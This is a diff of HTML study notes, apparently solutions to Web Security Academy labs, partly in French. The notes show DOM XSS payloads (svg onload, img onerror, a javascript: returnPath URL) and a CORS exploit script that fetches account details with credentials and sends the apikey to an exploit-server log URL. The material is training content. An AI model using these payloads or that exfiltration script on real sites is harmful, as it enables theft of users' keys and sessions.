@@ -2785,7 +2785,9 @@ document.write function is called with data from location.search, which
 you can control using the website URL.</p>
 <p>To solve this lab, perform a cross-site scripting attack that calls the
 alert function.</p>
-<p><strong>Resolution : "&gt;<svg onload=alert(1)></strong></p>
+<p>**Resolution :
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>"&gt;&lt;svg onload=alert(1)&gt;**
+</code></pre></div></p>
 <p><strong>Lab: DOM XSS in innerHTML sink using source location.search</strong></p>
 <p>This lab contains a DOM-based cross-site scripting vulnerability in the
 search blog functionality. It uses an innerHTML assignment, which
@@ -2793,7 +2795,9 @@ changes the HTML contents of a div element, using data from
 location.search.</p>
 <p>To solve this lab, perform a cross-site scripting attack that calls the
 alert function.</p>
-<p>Resolution: <img src=1 onerror=alert(1)></p>
+<p>Resolution: 
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>&lt;img src=1 onerror=alert(1)&gt;
+</code></pre></div></p>
 <p><strong>Lab: DOM XSS in jQuery anchor href attribute sink using
 location.search source</strong></p>
 <p>This lab contains a DOM-based cross-site scripting vulnerability in the
@@ -2801,7 +2805,8 @@ submit feedback page. It uses the jQuery library's $ selector function
 to find an anchor element, and changes its href attribute using data
 from location.search.</p>
 <p>To solve this lab, make the "back" link alert document.cookie.</p>
-<p>https://0adf00fc0445233780ecdf9b0084001a.web-security-academy.net/feedback?returnPath=javascript:alert(1)</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>https://0adf00fc0445233780ecdf9b0084001a.web-security-academy.net/feedback?returnPath=javascript:alert(1)
+</code></pre></div>
 <p><strong>Lab: DOM XSS in jQuery selector sink using a hashchange event</strong></p>
 <p>This lab contains a DOM-based cross-site scripting vulnerability on the
 home page. It uses jQuery's $() selector function to auto-scroll to a
@@ -2981,15 +2986,15 @@ Access-Control-Allow-Credentials: true
 <p>→ Vulnérable ✅</p>
 <p><strong>Étape 3 — Payload sur le serveur d'exploit</strong></p>
 <p>Sur le serveur d'exploit, coller dans le body :</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">  </span><span class="nx">fetch</span><span class="p">(</span><span class="s2">"https://LAB-ID.web-security-academy.net/accountDetails"</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
-<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="nx">credentials</span><span class="o">:</span><span class="w"> </span><span class="s2">"include"</span>
-<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">  </span><span class="p">})</span>
-<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">  </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
-<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">  </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
-<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">    </span><span class="nx">fetch</span><span class="p">(</span><span class="s2">"https://EXPLOIT-SERVER.exploit-server.net/log?key="</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">apikey</span><span class="p">)</span>
-<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">  </span><span class="p">})</span>
-<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">  </span><span class="nx">fetch</span><span class="p">(</span><span class="s2">"https://LAB-ID.web-security-academy.net/accountDetails"</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">    </span><span class="nx">credentials</span><span class="o">:</span><span class="w"> </span><span class="s2">"include"</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">  </span><span class="p">})</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">  </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">  </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">    </span><span class="nx">fetch</span><span class="p">(</span><span class="s2">"https://EXPLOIT-SERVER.exploit-server.net/log?key="</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">apikey</span><span class="p">)</span>
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="w">  </span><span class="p">})</span>
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </code></pre></div>
 <p>⚠️ Le champ s'appelle <code>apikey</code> (tout en minuscules) — pas <code>apiKey</code>.</p>
 <p><strong>Étape 4 — Deliver to victim</strong></p>
